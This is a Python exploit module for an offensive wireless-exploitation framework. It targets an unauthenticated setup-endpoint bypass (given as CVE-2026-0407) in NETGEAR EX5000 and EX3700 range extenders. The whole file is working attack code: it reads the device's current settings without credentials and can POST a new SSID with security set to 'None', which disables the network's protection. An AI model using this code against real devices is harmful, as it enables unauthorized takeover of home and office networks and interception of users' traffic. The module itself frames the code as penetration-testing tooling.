# Author: Andre Henrique (LinkedIn/X: @mrhenrike)
import socket
import time
import urllib.parse
import urllib.request

from wirelessxpl.core.exploit import *
from wirelessxpl.core.exploit.exploit import BaseExploit


class Exploit(BaseExploit):
    """NETGEAR EX5000 Extender Authentication Bypass (CVE-2026-0407).

    The NETGEAR EX5000 WiFi range extender exposes the setup wizard
    endpoints without proper authentication enforcement. After initial
    setup, the ``/setup.cgi`` and ``/currentsetting.htm`` endpoints
    remain accessible without a session cookie, allowing an attacker
    to reconfigure the extender (change SSID, disable security,
    redirect traffic) from the local network.

    CVSS v3.1: 8.8 (High), AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H

    Author: Andre Henrique (LinkedIn/X: @mrhenrike)
    Version: 1.0.0
    """

    __info__ = {
        "name": "NETGEAR EX5000 Extender Authentication Bypass (CVE-2026-0407)",
        "description": (
            "Exploits CVE-2026-0407 via authentication bypass on the "
            "NETGEAR EX5000 WiFi extender. Setup wizard endpoints "
            "remain accessible without session validation, allowing "
            "unauthenticated reconfiguration of the extender from the "
            "local network."
        ),
        "authors": (
            "Security researcher (discovery)",
            "Andre Henrique (@mrhenrike)",
        ),
        "references": (
            "https://nvd.nist.gov/vuln/detail/CVE-2026-0407",
            "https://kb.netgear.com/000066540/Security-Advisory",
        ),
        "disclosure_date": "2026-01-08",
        "platform": "linux",
        "arch": "arm",
        "privileged": False,
        "targets": (
            "NETGEAR EX5000 (firmware < 1.0.0.52)",
            "NETGEAR EX3700 (firmware < 1.0.0.96)",
        ),
    }

    target = OptIP("", "Target extender IP")
    port = OptPort(80, "Target HTTP port")
    timeout = OptFloat(5.0, "HTTP request timeout in seconds")
    new_ssid = OptString("", "New SSID to set (leave empty for check-only)")

    _SETUP_PATH = "/setup.cgi"
    _SETTINGS_PATH = "/currentsetting.htm"

    def _build_url(self, path: str) -> str:
        return f"http://{self.target}:{self.port}{path}"

    def _http_get(self, path: str) -> tuple[int, str]:
        url = self._build_url(path)
        req = urllib.request.Request(url, method="GET")
        req.add_header("User-Agent", "Mozilla/5.0")
        try:
            with urllib.request.urlopen(req, timeout=self.timeout) as resp:
                return resp.status, resp.read().decode("utf-8", errors="replace")
        except urllib.error.HTTPError as exc:
            return exc.code, exc.read().decode("utf-8", errors="replace")
        except Exception:
            return 0, ""

    def _http_post(self, path: str, data: dict) -> tuple[int, str]:
        url = self._build_url(path)
        encoded = urllib.parse.urlencode(data).encode("utf-8")
        req = urllib.request.Request(url, data=encoded, method="POST")
        req.add_header("User-Agent", "Mozilla/5.0")
        req.add_header("Content-Type", "application/x-www-form-urlencoded")
        try:
            with urllib.request.urlopen(req, timeout=self.timeout) as resp:
                return resp.status, resp.read().decode("utf-8", errors="replace")
        except urllib.error.HTTPError as exc:
            return exc.code, exc.read().decode("utf-8", errors="replace")
        except Exception:
            return 0, ""

    @mute
    def check(self) -> bool:
        """Check if setup endpoints are accessible without auth."""
        try:
            status, body = self._http_get(self._SETTINGS_PATH)
            if status == 200 and ("ssid" in body.lower() or "firmware" in body.lower()):
                return True
            return False
        except Exception:
            return False

    def run(self) -> None:
        if not self.check():
            print_error(
                f"Setup endpoints not accessible at {self.target}:{self.port}"
            )
            return

        print_success(
            "Authentication bypass confirmed: setup endpoints accessible "
            "without credentials"
        )
        self._exploit()

    def _exploit(self) -> None:
        # Read current settings
        status, body = self._http_get(self._SETTINGS_PATH)
        if status == 200:
            print_info(f"Current settings ({len(body)} bytes):")
            for line in body[:2048].splitlines():
                stripped = line.strip()
                if stripped and "=" in stripped:
                    print_info(f"  {stripped}")

        if self.new_ssid:
            payload = {
                "ssid": self.new_ssid,
                "security_type": "None",
                "submit_flag": "apply_settings",
            }

            print_status(f"Reconfiguring extender SSID to: {self.new_ssid!r}")

            status, body = self._http_post(self._SETUP_PATH, payload)

            if status == 200:
                print_success(
                    f"Extender reconfigured. SSID changed to '{self.new_ssid}' "
                    f"with security disabled."
                )
            else:
                print_error(f"Reconfiguration failed: HTTP {status}")
        else:
            print_info(
                "Set 'new_ssid' option to reconfigure the extender. "
                "Current run was check-only."
            )
